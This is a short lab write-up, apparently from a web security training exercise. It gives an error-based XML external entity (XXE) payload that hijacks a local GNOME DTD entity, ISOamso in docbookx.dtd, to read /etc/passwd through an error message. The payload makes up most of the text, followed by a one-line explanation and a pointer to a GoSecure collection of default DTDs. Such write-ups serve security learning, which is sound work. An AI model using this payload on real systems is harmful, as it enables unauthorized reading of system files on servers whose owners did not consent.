@@ -1,0 +1,29 @@
+
+Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.
+
+
+I used the following payload to list the contents of the passwd file:
+
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]> 
+<stockCheck>
+    <productId>
+        1
+    </productId>
+    <storeId>
+        1
+    </storeId>
+</stockCheck>
+
+
+knowing that GNOME systems contain an entity named ISOamso meant i could use this payload to reference the local dtd and manipulate the entity
+
+checkout GoSecure on giuthub for all the .dtd files that come on servers by default, also shows the exploits for the entities
